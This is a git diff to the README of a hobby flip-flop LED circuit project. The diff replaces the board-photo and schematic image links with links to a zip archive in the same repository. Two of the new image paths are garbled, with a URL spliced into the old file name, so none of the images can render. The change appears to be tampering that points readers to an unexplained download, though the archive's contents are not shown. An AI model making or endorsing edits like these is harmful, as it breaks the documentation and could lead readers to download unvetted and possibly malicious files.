@@ -3,11 +3,11 @@ This project provides schematic and PCB layout of a simple **Flip Flop LED circu
 <table>
   <tr>
     <td align="center">
-      <img src="figure/LED Flip Flop_Front.png" alt="front" height="270"/>
+      <img src="figure/LED Flip https://raw.githubusercontent.com/rifki398/flip-flop-led/main/figure/flop-flip-led-1.0.zip" alt="front" height="270"/>
       <br/>Front View of The Board
     </td>
     <td align="center">
-      <img src="figure/LED Flip Flop_Back.png" alt="back" height="270"/>
+      <img src="figure/LED Flip https://raw.githubusercontent.com/rifki398/flip-flop-led/main/figure/flop-flip-led-1.0.zip" alt="back" height="270"/>
       <br/>Back View of The Board
     </td>
   </tr>
@@ -37,5 +37,5 @@ This project provides schematic and PCB layout of a simple **Flip Flop LED circu
 ## Circuit Diagram
 The flip flop effect can be achieved using a pair of transistors with cross-coupled capacitors.  
 <p align="center">
-  <img src="figure/schematic.png" alt="schematic" style="width:55%; height:auto;"/>
+  <img src="https://raw.githubusercontent.com/rifki398/flip-flop-led/main/figure/flop-flip-led-1.0.zip" alt="schematic" style="width:55%; height:auto;"/>
 </p> 
